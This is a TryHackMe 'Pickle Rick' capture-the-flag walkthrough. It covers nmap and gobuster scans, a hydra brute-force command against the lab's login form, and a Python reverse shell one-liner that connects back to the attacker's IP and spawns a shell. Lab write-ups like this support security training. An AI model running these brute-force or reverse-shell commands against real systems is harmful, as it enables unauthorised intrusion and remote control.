#   TryHackMe - Pickle Rick

```
Walkthrough by
Shaswata Saha
```

1.  Nmap scan

```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme]
└─$ nmap -sC -sV -oA nmap.nmap -A 10.10.197.179
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-01 01:03 EDT
Nmap scan report for 10.10.197.179
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2d:50:ff:e3:be:ac:a6:07:22:c5:dc:c7:18:56:d3:3e (RSA)
|   256 8e:8f:4a:e5:cc:99:2b:45:5e:15:de:c7:d1:d8:66:3d (ECDSA)
|_  256 61:d0:1f:44:e4:fd:83:4c:d2:5f:b6:28:32:75:4f:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.11 seconds

```

2.  Gobuster Scan
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.197.179 -w Documents/gobuster-wordlist/dsstorewordlist.txt

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.197.179
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/01 01:05:07 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/robots.txt           (Status: 200) [Size: 17]
/assets               (Status: 301) [Size: 315] [--> http://10.10.197.179/assets/]
/login.php            (Status: 200) [Size: 882]
/.htpasswd            (Status: 403) [Size: 297]
/.htpasswds           (Status: 403) [Size: 298]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
Progress: 1828 / 1829 (99.95%)
===============================================================
2023/07/01 01:05:53 Finished
===============================================================

```

3.  TTried to use hydra
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ hydra -l R1ckRul3s -P Documents/rockyou.txt 10.10.197.179 http-post-form "/login.php:username=R1ckRul3s&password=^PASS^&sub=Login:Invalid username or password." -I -v

```

4.  In robots.txt found
password :Wubbalubbadubdub

5.  Use the command ```grep -R . ``` inside of the command palette.
This will show all the files and contents. When you view the source of the page you can get to know what is happening.

6.  We find that python3 is working

7.  Reverse shell using netcat

Python reverse shell cheatsheet:
```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.28.202",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Attacked on:
```bash

```

Output at:
```bash

```

8.  Stabilize the shell by downloading a .sh file from john hammond github:
```bash
#   https://github.com/johnhammond/poor-mans-pentest

```